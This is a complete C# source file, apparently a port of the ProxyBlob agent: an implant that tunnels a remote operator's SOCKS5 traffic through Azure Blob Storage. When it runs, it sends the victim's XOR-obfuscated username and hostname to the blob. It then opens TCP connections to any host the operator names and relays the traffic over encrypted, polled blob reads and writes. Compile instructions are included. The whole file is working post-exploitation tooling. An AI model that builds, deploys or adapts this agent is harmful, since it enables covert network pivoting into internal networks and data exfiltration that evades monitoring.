/*
 * ProxyBlob Agent — Standalone C# Console App
 * ==============================================
 * Faithful port of the Go agent from github.com/quarkslab/proxyblob
 *
 * Run:  ProxyBlobStandalone.exe <connection-string>
 *
 * Compile:
 *   nuget install BouncyCastle.Cryptography -Version 2.5.1 -OutputDirectory packages
 *   csc.exe /platform:anycpu /out:ProxyBlobStandalone.exe ProxyBlobStandalone.cs ^
 *       /r:packages\BouncyCastle.Cryptography.2.5.1\lib\netstandard2.0\BouncyCastle.Cryptography.dll ^
 *       /r:System.Net.Http.dll /r:netstandard.dll
 */

using System;
using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Agreement;
using Org.BouncyCastle.Crypto.Digests;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Macs;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Security;

namespace ProxyBlob
{
    static class Proto
    {
        public const byte CmdNew   = 1;
        public const byte CmdAck   = 2;
        public const byte CmdData  = 3;
        public const byte CmdClose = 4;

        public const int CommandSize    = 1;
        public const int UUIDSize       = 16;
        public const int DataLengthSize = 4;
        public const int HeaderSize     = CommandSize + UUIDSize + DataLengthSize; // 21

        // SOCKS5
        public const byte S5      = 0x05;
        public const byte NoAuth  = 0x00;
        public const byte Connect = 0x01;

        // Address types
        public const byte AIPv4   = 0x01;
        public const byte ADomain = 0x03;
        public const byte AIPv6   = 0x04;

        // Reply codes
        public const byte ROk            = 0x00;
        public const byte RFail          = 0x01;
        public const byte RNetUnreach    = 0x03;
        public const byte RHostUnreach   = 0x04;
        public const byte RConnRefused   = 0x05;
        public const byte RTTLExpired    = 0x06;
        public const byte RCmdNotSup     = 0x07;
        public const byte RAddrNotSup    = 0x08;

        public static readonly byte[] InfoKey = { 0xDE, 0xAD, 0xB1, 0x0B };
    }

    class Pkt
    {
        public byte Cmd;
        public byte[] ConnId; // raw 16 bytes, NOT Guid
        public byte[] Data;

        public byte[] Encode()
        {
            int dlen = Data != null ? Data.Length : 0;
            byte[] buf = new byte[Proto.HeaderSize + dlen];
            buf[0] = Cmd;
            Buffer.BlockCopy(ConnId, 0, buf, 1, 16);
            // Big-endian data length
            buf[17] = (byte)(dlen >> 24);
            buf[18] = (byte)(dlen >> 16);
            buf[19] = (byte)(dlen >> 8);
            buf[20] = (byte)(dlen);
            if (dlen > 0)
                Buffer.BlockCopy(Data, 0, buf, Proto.HeaderSize, dlen);
            return buf;
        }

        public static Pkt Decode(byte[] raw)
        {
            if (raw == null || raw.Length < Proto.HeaderSize) return null;
            byte cmd = raw[0];
            if (cmd < Proto.CmdNew || cmd > Proto.CmdClose) return null;

            byte[] id = new byte[16];
            Buffer.BlockCopy(raw, 1, id, 0, 16);

            uint dataLen = (uint)((raw[17] << 24) | (raw[18] << 16) | (raw[19] << 8) | raw[20]);
            if ((uint)raw.Length != (uint)Proto.HeaderSize + dataLen) return null;

            byte[] data = null;
            if (dataLen > 0)
            {
                data = new byte[dataLen];
                Buffer.BlockCopy(raw, Proto.HeaderSize, data, 0, (int)dataLen);
            }
            return new Pkt { Cmd = cmd, ConnId = id, Data = data };
        }
    }

    class Conn
    {
        public byte[] Id;  // raw 16 bytes
        public byte[] Key; // symmetric key after ECDH
        public BlockingCollection<byte[]> ReadBuf = new BlockingCollection<byte[]>(128);
        public TcpClient Tcp;
        public CancellationTokenSource Cts = new CancellationTokenSource();
        int _dead;
        public bool Dead { get { return Interlocked.CompareExchange(ref _dead, 0, 0) != 0; } }

        public void Kill()
        {
            if (Interlocked.Exchange(ref _dead, 1) != 0) return;
            Cts.Cancel();
            try { Tcp?.Close(); } catch { }
            try { ReadBuf.CompleteAdding(); } catch { }
        }

        // Key for ConcurrentDictionary: convert 16-byte ID to string key
        public string IdKey { get { return Convert.ToBase64String(Id); } }
        public static string MakeKey(byte[] id) { return Convert.ToBase64String(id); }
    }

    static class Crypto
    {
        static readonly SecureRandom Rng = new SecureRandom();

        // ── X25519 key pair generation ──────────────────────────
        public static void GenX25519(out byte[] priv, out byte[] pub)
        {
            var kpg = new X25519KeyPairGenerator();
            kpg.Init(new X25519KeyGenerationParameters(Rng));
            var kp = kpg.GenerateKeyPair();
            priv = ((X25519PrivateKeyParameters)kp.Private).GetEncoded();
            pub  = ((X25519PublicKeyParameters)kp.Public).GetEncoded();
        }

        // ── X25519 + HKDF-SHA3-256 key derivation ──────────────
        // Matches Go: DeriveKey(privateKey, peerPublicKey, nonce)
        //   1. sharedSecret = X25519(priv, peerPub)
        //   2. key = HKDF(SHA3-256, secret=sharedSecret, salt=nonce, info=nil)
        public static byte[] DeriveKey(byte[] privRaw, byte[] peerPubRaw, byte[] nonce)
        {
            // X25519 agreement
            var priv = new X25519PrivateKeyParameters(privRaw, 0);
            var peer = new X25519PublicKeyParameters(peerPubRaw, 0);
            var agree = new X25519Agreement();
            agree.Init(priv);
            byte[] sharedSecret = new byte[agree.AgreementSize];
            agree.CalculateAgreement(peer, sharedSecret, 0);

            // HKDF with SHA3-256
            // Go code: hkdf.New(sha3.New256, sharedSecret, nonce, nil)
            // This is: Extract(salt=nonce, IKM=sharedSecret), then Expand(PRK, info=empty, L=32)
            return HkdfSha3256(sharedSecret, nonce, 32);
        }

        // RFC 5869 HKDF using HMAC-SHA3-256
        static byte[] HkdfSha3256(byte[] ikm, byte[] salt, int outputLen)
        {
            // Step 1: Extract — PRK = HMAC-SHA3-256(salt, IKM)
            byte[] prk = HmacSha3256(salt, ikm);

            // Step 2: Expand — Go's hkdf with nil info
            // T(1) = HMAC-SHA3-256(PRK, info || 0x01) where info is empty
            // Since outputLen=32 = hash output size, only 1 block needed
            byte[] t1Input = new byte[] { 0x01 }; // empty info + counter byte
            return HmacSha3256(prk, t1Input);
        }

        static byte[] HmacSha3256(byte[] key, byte[] data)
        {
            var hmac = new HMac(new Sha3Digest(256));
            hmac.Init(new KeyParameter(key));
            hmac.BlockUpdate(data, 0, data.Length);
            byte[] result = new byte[hmac.GetMacSize()];
            hmac.DoFinal(result, 0);
            return result;
        }

        public static byte[] Encrypt(byte[] key, byte[] plaintext)
        {
            byte[] nonce = new byte[24];
            Rng.NextBytes(nonce);

            // HChaCha20: derive subkey from key and first 16 bytes of nonce
            byte[] subkey = HChaCha20(key, nonce);

            // Build 12-byte IETF nonce: 0x00000000 || nonce[16:24]
            byte[] ietfNonce = new byte[12];
            Buffer.BlockCopy(nonce, 16, ietfNonce, 4, 8);

            // ChaCha20-Poly1305 encrypt with subkey and IETF nonce
            var aead = new ChaCha20Poly1305();
            aead.Init(true, new ParametersWithIV(new KeyParameter(subkey), ietfNonce));
            byte[] ct = new byte[aead.GetOutputSize(plaintext.Length)];
            int len = aead.ProcessBytes(plaintext, 0, plaintext.Length, ct, 0);
            len += aead.DoFinal(ct, len);

            // Output: nonce(24) || ciphertext+tag
            byte[] result = new byte[24 + len];
            Buffer.BlockCopy(nonce, 0, result, 0, 24);
            Buffer.BlockCopy(ct, 0, result, 24, len);
            return result;
        }

        // Decrypt: input is nonce(24) || ciphertext || tag(16)
        public static byte[] Decrypt(byte[] key, byte[] blob)
        {
            if (blob == null || blob.Length < 24 + 16) return null;

            byte[] nonce = new byte[24];
            Buffer.BlockCopy(blob, 0, nonce, 0, 24);

            byte[] ct = new byte[blob.Length - 24];
            Buffer.BlockCopy(blob, 24, ct, 0, ct.Length);

            try
            {
                // HChaCha20: derive subkey
                byte[] subkey = HChaCha20(key, nonce);

                // IETF nonce: 0x00000000 || nonce[16:24]
                byte[] ietfNonce = new byte[12];
                Buffer.BlockCopy(nonce, 16, ietfNonce, 4, 8);

                var aead = new ChaCha20Poly1305();
                aead.Init(false, new ParametersWithIV(new KeyParameter(subkey), ietfNonce));
                byte[] plain = new byte[aead.GetOutputSize(ct.Length)];
                int len = aead.ProcessBytes(ct, 0, ct.Length, plain, 0);
                len += aead.DoFinal(plain, len);
                byte[] result = new byte[len];
                Buffer.BlockCopy(plain, 0, result, 0, len);
                return result;
            }
            catch { return null; }
        }

        static byte[] HChaCha20(byte[] key, byte[] nonce)
        {

            uint[] state = new uint[16];
            // Constants "expand 32-byte k"
            state[0]  = 0x61707865;
            state[1]  = 0x3320646e;
            state[2]  = 0x79622d32;
            state[3]  = 0x6b206574;
            // Key
            state[4]  = LE32(key, 0);
            state[5]  = LE32(key, 4);
            state[6]  = LE32(key, 8);
            state[7]  = LE32(key, 12);
            state[8]  = LE32(key, 16);
            state[9]  = LE32(key, 20);
            state[10] = LE32(key, 24);
            state[11] = LE32(key, 28);
            // Nonce (first 16 bytes)
            state[12] = LE32(nonce, 0);
            state[13] = LE32(nonce, 4);
            state[14] = LE32(nonce, 8);
            state[15] = LE32(nonce, 12);

            // 20 rounds (10 double-rounds)
            for (int i = 0; i < 10; i++)
            {
                // Column rounds
                QR(state, 0, 4,  8, 12);
                QR(state, 1, 5,  9, 13);
                QR(state, 2, 6, 10, 14);
                QR(state, 3, 7, 11, 15);
                // Diagonal rounds
                QR(state, 0, 5, 10, 15);
                QR(state, 1, 6, 11, 12);
                QR(state, 2, 7,  8, 13);
                QR(state, 3, 4,  9, 14);
            }

            // Output: state[0..3] and state[12..15] → 32-byte subkey
            byte[] subkey = new byte[32];
            PutLE32(subkey, 0,  state[0]);
            PutLE32(subkey, 4,  state[1]);
            PutLE32(subkey, 8,  state[2]);
            PutLE32(subkey, 12, state[3]);
            PutLE32(subkey, 16, state[12]);
            PutLE32(subkey, 20, state[13]);
            PutLE32(subkey, 24, state[14]);
            PutLE32(subkey, 28, state[15]);
            return subkey;
        }

        static void QR(uint[] s, int a, int b, int c, int d)
        {
            s[a] += s[b]; s[d] ^= s[a]; s[d] = RotL(s[d], 16);
            s[c] += s[d]; s[b] ^= s[c]; s[b] = RotL(s[b], 12);
            s[a] += s[b]; s[d] ^= s[a]; s[d] = RotL(s[d], 8);
            s[c] += s[d]; s[b] ^= s[c]; s[b] = RotL(s[b], 7);
        }

        static uint RotL(uint v, int n) => (v << n) | (v >> (32 - n));
        static uint LE32(byte[] b, int i) =>
            (uint)b[i] | ((uint)b[i+1] << 8) | ((uint)b[i+2] << 16) | ((uint)b[i+3] << 24);
        static void PutLE32(byte[] b, int i, uint v)
        {
            b[i]   = (byte)v;
            b[i+1] = (byte)(v >> 8);
            b[i+2] = (byte)(v >> 16);
            b[i+3] = (byte)(v >> 24);
        }

        // ── XOR for info blob ───────────────────────────────────
        public static byte[] Xor(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            return result;
        }
    }

    // ═══════════════════════════════════════════════════════════════
    //  BLOB HTTP TRANSPORT — raw REST API, no Azure SDK
    // ═══════════════════════════════════════════════════════════════
    class BlobHttp
    {
        readonly string _baseUrl;
        readonly string _sas;
        readonly HttpClient _http;
        readonly object _sendLock = new object();
        const int InitDelay = 50;
        const int MaxDelay = 3000;

        public BlobHttp(string baseUrl, string sas)
        {
            _baseUrl = baseUrl.TrimEnd('/');
            _sas = sas;
            _http = new HttpClient();
            _http.DefaultRequestHeaders.Add("x-ms-version", "2020-10-02");
        }

        string Url(string blob) => _baseUrl + "/" + blob + "?" + _sas;

        // Poll-wait-write: wait until blob is empty, then upload
        public void Send(string blob, byte[] data, CancellationToken ct)
        {
            lock (_sendLock)
            {
                int delay = InitDelay;
                while (!ct.IsCancellationRequested)
                {
                    long size = GetSize(blob, ct);
                    if (size > 0)
                    {
                        Thread.Sleep(delay);
                        delay = Math.Min((int)(delay * 1.5), MaxDelay);
                        continue;
                    }
                    delay = InitDelay;
                    try { Upload(blob, data, ct); return; }
                    catch (OperationCanceledException) { throw; }
                    catch
                    {
                        Thread.Sleep(delay);
                        delay = Math.Min((int)(delay * 1.5), MaxDelay);
                    }
                }
                ct.ThrowIfCancellationRequested();
            }
        }

        // Poll-wait-read-clear: wait until blob has data, download, then clear
        public byte[] Recv(string blob, CancellationToken ct)
        {
            int delay = InitDelay;
            while (!ct.IsCancellationRequested)
            {
                long size = GetSize(blob, ct);
                if (size <= 0)
                {
                    Thread.Sleep(delay);
                    delay = Math.Min((int)(delay * 1.5), MaxDelay);
                    continue;
                }
                delay = InitDelay;
                try
                {
                    byte[] data = Download(blob, ct);
                    if (data != null && data.Length > 0)
                    {
                        Clear(blob, ct);
                        return data;
                    }
                }
                catch (OperationCanceledException) { throw; }
                catch
                {
                    Thread.Sleep(delay);
                    delay = Math.Min((int)(delay * 1.5), MaxDelay);
                }
            }
            ct.ThrowIfCancellationRequested();
            return null;
        }

        long GetSize(string blob, CancellationToken ct)
        {
            try
            {
                using (var req = new HttpRequestMessage(HttpMethod.Head, Url(blob)))
                using (var resp = _http.SendAsync(req, ct).GetAwaiter().GetResult())
                {
                    if (!resp.IsSuccessStatusCode) return -1;
                    return resp.Content.Headers.ContentLength ?? 0;
                }
            }
            catch (OperationCanceledException) { throw; }
            catch { return -1; }
        }

        byte[] Download(string blob, CancellationToken ct)
        {
            using (var resp = _http.GetAsync(Url(blob), ct).GetAwaiter().GetResult())
            {
                resp.EnsureSuccessStatusCode();
                return resp.Content.ReadAsByteArrayAsync().GetAwaiter().GetResult();
            }
        }

        void Upload(string blob, byte[] data, CancellationToken ct)
        {
            using (var req = new HttpRequestMessage(HttpMethod.Put, Url(blob)))
            {
                req.Headers.Add("x-ms-blob-type", "BlockBlob");
                req.Content = new ByteArrayContent(data);
                req.Content.Headers.ContentType =
                    new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
                using (var resp = _http.SendAsync(req, ct).GetAwaiter().GetResult())
                    resp.EnsureSuccessStatusCode();
            }
        }

        void Clear(string blob, CancellationToken ct)
        {
            int delay = InitDelay;
            while (!ct.IsCancellationRequested)
            {
                try { Upload(blob, new byte[0], ct); return; }
                catch (OperationCanceledException) { throw; }
                catch
                {
                    Thread.Sleep(delay);
                    delay = Math.Min((int)(delay * 1.5), MaxDelay);
                }
            }
        }

        public void WriteInfo(byte[] data, CancellationToken ct)
        {
            using (var req = new HttpRequestMessage(HttpMethod.Put, Url("info")))
            {
                req.Headers.Add("x-ms-blob-type", "BlockBlob");
                req.Content = new ByteArrayContent(data);
                req.Content.Headers.ContentType =
                    new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
                using (var resp = _http.SendAsync(req, ct).GetAwaiter().GetResult())
                    resp.EnsureSuccessStatusCode();
            }
        }

        public bool HealthCheck()
        {
            try
            {
                using (var req = new HttpRequestMessage(HttpMethod.Head, Url("info")))
                using (var resp = _http.SendAsync(req).GetAwaiter().GetResult())
                    return resp.IsSuccessStatusCode;
            }
            catch { return false; }
        }
    }

    // ═══════════════════════════════════════════════════════════════
    //  AGENT — main logic
    // ═══════════════════════════════════════════════════════════════
    class Program
    {
        static ConcurrentDictionary<string, Conn> _conns = new ConcurrentDictionary<string, Conn>();
        static BlobHttp _http;
        static CancellationTokenSource _cts = new CancellationTokenSource();

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.Error.WriteLine("Usage: ProxyBlobStandalone.exe <connection-string>");
                Environment.Exit(2);
            }

            string connStr = args[0];
            Console.Error.WriteLine("[*] ProxyBlob Agent starting...");

            try
            {
                Run(connStr);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] Fatal: " + ex.Message);
                if (ex.InnerException != null)
                    Console.Error.WriteLine("[!] Inner: " + ex.InnerException.Message);
                if (ex.InnerException?.InnerException != null)
                    Console.Error.WriteLine("[!] Inner2: " + ex.InnerException.InnerException.Message);
                Console.Error.WriteLine("[!] Stack: " + ex.ToString());
                Environment.Exit(1);
            }
        }

        static void Run(string connStr)
        {
            // Parse connection string: base64( https://account.blob.core.windows.net/uuid?sas )
            // Go uses base64.RawStdEncoding (no padding) — handle both
            string b64 = connStr;
            // Add padding if needed
            int pad = b64.Length % 4;
            if (pad > 0) b64 += new string('=', 4 - pad);

            string decoded;
            try
            {
                decoded = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] Invalid connection string: " + ex.Message);
                Environment.Exit(3);
                return;
            }

            Console.Error.WriteLine("[*] Decoded URL: " + decoded);

            Uri uri;
            try { uri = new Uri(decoded); }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] Invalid URL in connection string: " + ex.Message);
                Environment.Exit(3);
                return;
            }

            string baseUrl = uri.Scheme + "://" + uri.Host + uri.AbsolutePath;
            string sas = uri.Query.TrimStart('?');

            Console.Error.WriteLine("[*] Base URL: " + baseUrl);
            Console.Error.WriteLine("[*] SAS token: " + (sas.Length > 20 ? sas.Substring(0, 20) + "..." : sas));

            _http = new BlobHttp(baseUrl, sas);

            // Write info blob (XOR-obfuscated username@hostname)
            string info = Environment.UserName + "@" + Environment.MachineName;
            Console.Error.WriteLine("[*] Agent info: " + info);

            byte[] infoBytes = Encoding.UTF8.GetBytes(info);
            byte[] encInfo = Crypto.Xor(infoBytes, Proto.InfoKey);

            try
            {
                _http.WriteInfo(encInfo, _cts.Token);
                Console.Error.WriteLine("[+] Info blob written successfully");
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] Failed to write info blob: " + ex.Message);
                Environment.Exit(4);
                return;
            }

            // Health check thread
            Task.Run(() =>
            {
                while (!_cts.IsCancellationRequested)
                {
                    Thread.Sleep(30000);
                    if (!_http.HealthCheck())
                    {
                        Console.Error.WriteLine("[!] Health check failed — container deleted?");
                        _cts.Cancel();
                        return;
                    }
                    Console.Error.WriteLine("[*] Health check OK");
                }
            });

            // Main receive loop
            Console.Error.WriteLine("[*] Entering receive loop — polling request blob...");
            int consecutiveErrors = 0;

            try
            {
                while (!_cts.IsCancellationRequested)
                {
                    byte[] raw;
                    try
                    {
                        raw = _http.Recv("request", _cts.Token);
                    }
                    catch (OperationCanceledException) { break; }
                    catch (Exception ex)
                    {
                        consecutiveErrors++;
                        Console.Error.WriteLine("[!] Recv error #{0}: {1}", consecutiveErrors, ex.Message);
                        if (consecutiveErrors >= 5) break;
                        Thread.Sleep(consecutiveErrors * 50);
                        continue;
                    }

                    consecutiveErrors = 0;

                    if (raw == null || raw.Length == 0) continue;

                    var pkt = Pkt.Decode(raw);
                    if (pkt == null)
                    {
                        Console.Error.WriteLine("[!] Failed to decode packet (len={0})", raw.Length);
                        continue;
                    }

                    Console.Error.WriteLine("[<] Cmd={0} ConnId={1} DataLen={2}",
                        CmdName(pkt.Cmd), Hex(pkt.ConnId, 4), pkt.Data?.Length ?? 0);

                    switch (pkt.Cmd)
                    {
                        case Proto.CmdNew:   HandleNew(pkt); break;
                        case Proto.CmdData:  HandleData(pkt); break;
                        case Proto.CmdClose: HandleClose(pkt); break;
                        default:
                            Console.Error.WriteLine("[!] Unexpected cmd: " + pkt.Cmd);
                            break;
                    }
                }
            }
            catch (OperationCanceledException) { }
            finally
            {
                Console.Error.WriteLine("[*] Shutting down — closing {0} connections", _conns.Count);
                foreach (var c in _conns.Values) c.Kill();
            }

            Console.Error.WriteLine("[*] Agent exited.");
        }

        // ── OnNew: key exchange + start SOCKS handler ───────────
        static void HandleNew(Pkt pkt)
        {
            string key = Conn.MakeKey(pkt.ConnId);

            if (pkt.Data == null || pkt.Data.Length < 56) // 24 nonce + 32 pubkey
            {
                Console.Error.WriteLine("[!] CmdNew data too short: {0}", pkt.Data?.Length ?? 0);
                return;
            }

            // Extract nonce(24) and server public key(32) from CmdNew payload
            byte[] nonce = new byte[24];
            byte[] serverPub = new byte[32];
            Buffer.BlockCopy(pkt.Data, 0, nonce, 0, 24);
            Buffer.BlockCopy(pkt.Data, 24, serverPub, 0, 32);

            // Generate our X25519 keypair
            byte[] priv, pub;
            Crypto.GenX25519(out priv, out pub);

            // Derive symmetric key: X25519(priv, serverPub) → HKDF(sharedSecret, nonce)
            byte[] symKey;
            try
            {
                symKey = Crypto.DeriveKey(priv, serverPub, nonce);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] Key derivation failed: " + ex.Message);
                return;
            }

            var conn = new Conn { Id = pkt.ConnId, Key = symKey };
            if (!_conns.TryAdd(key, conn))
            {
                Console.Error.WriteLine("[!] Connection already exists");
                return;
            }

            // Send CmdAck with our public key
            var ack = new Pkt { Cmd = Proto.CmdAck, ConnId = pkt.ConnId, Data = pub };
            try
            {
                _http.Send("response", ack.Encode(), _cts.Token);
                Console.Error.WriteLine("[>] Sent CmdAck with pubkey");
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] Failed to send ACK: " + ex.Message);
                conn.Kill();
                _conns.TryRemove(key, out _);
                return;
            }

            // Start SOCKS handler for this connection
            Task.Run(() => DoSocks(conn));
        }

        // ── OnData: decrypt and queue to connection ─────────────
        static void HandleData(Pkt pkt)
        {
            string key = Conn.MakeKey(pkt.ConnId);
            Conn conn;
            if (!_conns.TryGetValue(key, out conn) || conn.Dead) return;

            byte[] plain = Crypto.Decrypt(conn.Key, pkt.Data);
            if (plain == null)
            {
                Console.Error.WriteLine("[!] Decrypt failed for connection");
                SendClose(pkt.ConnId);
                return;
            }

            try { conn.ReadBuf.Add(plain); }
            catch { }
        }

        // ── OnClose: kill connection ────────────────────────────
        static void HandleClose(Pkt pkt)
        {
            string key = Conn.MakeKey(pkt.ConnId);
            Conn conn;
            if (_conns.TryRemove(key, out conn)) conn.Kill();
        }

        // ── SOCKS5 handler per connection ───────────────────────
        static void DoSocks(Conn c)
        {
            try
            {
                // Phase 1: Auth negotiation
                byte[] methods = TakeData(c);
                if (methods == null) { CloseConn(c); return; }

                bool hasNoAuth = false;
                for (int i = 0; i < methods.Length; i++)
                    if (methods[i] == Proto.NoAuth) { hasNoAuth = true; break; }

                if (!hasNoAuth)
                {
                    Console.Error.WriteLine("[!] No acceptable auth method");
                    TxEncrypted(c, new byte[] { Proto.S5, 0xFF });
                    CloseConn(c);
                    return;
                }

                TxEncrypted(c, new byte[] { Proto.S5, Proto.NoAuth });
                Console.Error.WriteLine("[*] Auth negotiated: NoAuth");

                // Phase 2: Command
                byte[] cmd = TakeData(c);
                if (cmd == null || cmd.Length < 4 || cmd[0] != Proto.S5)
                {
                    Console.Error.WriteLine("[!] Invalid SOCKS command");
                    CloseConn(c);
                    return;
                }

                if (cmd[1] == Proto.Connect)
                {
                    DoConnect(c, cmd);
                }
                else
                {
                    Console.Error.WriteLine("[!] Unsupported SOCKS command: 0x{0:X2}", cmd[1]);
                    TxEncrypted(c, SocksReply(Proto.RCmdNotSup));
                    CloseConn(c);
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] DoSocks exception: " + ex.Message);
                CloseConn(c);
            }
        }

        static void DoConnect(Conn c, byte[] cmd)
        {
            // Parse target address from cmd[3:]
            string target;
            try
            {
                target = ParseAddress(cmd, 3);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] Address parse error: " + ex.Message);
                TxEncrypted(c, SocksReply(Proto.RFail));
                CloseConn(c);
                return;
            }

            Console.Error.WriteLine("[*] CONNECT to: " + target);

            // Connect to target
            TcpClient tcp;
            try
            {
                int lastColon = target.LastIndexOf(':');
                string host = target.Substring(0, lastColon).Trim('[', ']');
                int port = int.Parse(target.Substring(lastColon + 1));

                tcp = new TcpClient();
                var ar = tcp.BeginConnect(host, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(10000))
                {
                    tcp.Close();
                    throw new TimeoutException("Connection timed out");
                }
                tcp.EndConnect(ar);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] Connect failed: " + ex.Message);
                TxEncrypted(c, SocksReply(Proto.RConnRefused));
                CloseConn(c);
                return;
            }

            c.Tcp = tcp;
            Console.Error.WriteLine("[+] Connected to " + target);

            // Send success reply
            var ep = (IPEndPoint)tcp.Client.LocalEndPoint;
            byte[] reply = new byte[10];
            reply[0] = Proto.S5;
            reply[1] = Proto.ROk;
            reply[2] = 0x00;
            reply[3] = Proto.AIPv4;
            byte[] ipBytes = ep.Address.MapToIPv4().GetAddressBytes();
            if (ipBytes.Length >= 4) Buffer.BlockCopy(ipBytes, 0, reply, 4, 4);
            reply[8] = (byte)(ep.Port >> 8);
            reply[9] = (byte)(ep.Port & 0xFF);
            TxEncrypted(c, reply);

            var stream = tcp.GetStream();

            // Goroutine 1: Target → Proxy (read from TCP, send encrypted to blob)
            Task.Run(() =>
            {
                byte[] buf = new byte[128 * 1024];
                try
                {
                    while (!c.Dead && !_cts.IsCancellationRequested)
                    {
                        int n = stream.Read(buf, 0, buf.Length);
                        if (n <= 0) break;
                        byte[] chunk = new byte[n];
                        Buffer.BlockCopy(buf, 0, chunk, 0, n);
                        TxEncrypted(c, chunk);
                    }
                }
                catch { }
                finally { CloseConn(c); }
            });

            // Goroutine 2: Proxy → Target (read from queue, write to TCP)
            try
            {
                while (!c.Dead && !_cts.IsCancellationRequested)
                {
                    byte[] data = TakeData(c);
                    if (data == null) break;
                    stream.Write(data, 0, data.Length);
                    stream.Flush();
                }
            }
            catch { }
            finally { CloseConn(c); }
        }

        // ── Helpers ─────────────────────────────────────────────
        static byte[] TakeData(Conn c)
        {
            try
            {
                return c.ReadBuf.Take(c.Cts.Token);
            }
            catch { return null; }
        }

        static void TxEncrypted(Conn c, byte[] plaintext)
        {
            if (c.Dead) return;
            byte[] encrypted = Crypto.Encrypt(c.Key, plaintext);
            var pkt = new Pkt { Cmd = Proto.CmdData, ConnId = c.Id, Data = encrypted };
            try
            {
                _http.Send("response", pkt.Encode(), _cts.Token);
            }
            catch { }
        }

        static void CloseConn(Conn c)
        {
            string key = c.IdKey;
            if (!_conns.TryRemove(key, out _) && c.Dead) return;
            c.Kill();

            var pkt = new Pkt { Cmd = Proto.CmdClose, ConnId = c.Id, Data = new byte[] { 0 } };
            try
            {
                _http.Send("response", pkt.Encode(), _cts.Token);
            }
            catch { }
        }

        static void SendClose(byte[] connId)
        {
            var pkt = new Pkt { Cmd = Proto.CmdClose, ConnId = connId, Data = new byte[] { 0 } };
            try { _http.Send("response", pkt.Encode(), _cts.Token); } catch { }
        }

        static byte[] SocksReply(byte code)
        {
            return new byte[] { Proto.S5, code, 0x00, Proto.AIPv4, 0, 0, 0, 0, 0, 0 };
        }

        // ── Address parsing (matches Go's ParseAddress) ─────────
        // Input: cmd buffer starting at offset (ATYP byte)
        // Returns "host:port" string
        static string ParseAddress(byte[] buf, int offset)
        {
            byte atype = buf[offset];
            int cursor = offset + 1;
            string host;

            switch (atype)
            {
                case Proto.AIPv4:
                    if (buf.Length < cursor + 6) throw new Exception("IPv4 too short");
                    host = buf[cursor] + "." + buf[cursor+1] + "." + buf[cursor+2] + "." + buf[cursor+3];
                    cursor += 4;
                    break;

                case Proto.ADomain:
                    int domLen = buf[cursor++];
                    if (buf.Length < cursor + domLen + 2) throw new Exception("Domain too short");
                    host = Encoding.ASCII.GetString(buf, cursor, domLen);
                    cursor += domLen;
                    break;

                case Proto.AIPv6:
                    if (buf.Length < cursor + 18) throw new Exception("IPv6 too short");
                    byte[] ip6 = new byte[16];
                    Buffer.BlockCopy(buf, cursor, ip6, 0, 16);
                    host = "[" + new IPAddress(ip6).ToString() + "]";
                    cursor += 16;
                    break;

                default:
                    throw new Exception("Unsupported address type: 0x" + atype.ToString("X2"));
            }

            int port = (buf[cursor] << 8) | buf[cursor + 1];
            return host + ":" + port;
        }

        // ── Debug helpers ───────────────────────────────────────
        static string CmdName(byte cmd)
        {
            switch (cmd)
            {
                case Proto.CmdNew:   return "NEW";
                case Proto.CmdAck:   return "ACK";
                case Proto.CmdData:  return "DATA";
                case Proto.CmdClose: return "CLOSE";
                default: return "?" + cmd;
            }
        }

        static string Hex(byte[] b, int max)
        {
            if (b == null) return "(null)";
            var sb = new StringBuilder();
            int n = Math.Min(b.Length, max);
            for (int i = 0; i < n; i++) sb.Append(b[i].ToString("x2"));
            if (b.Length > max) sb.Append("..");
            return sb.ToString();
        }
    }
}
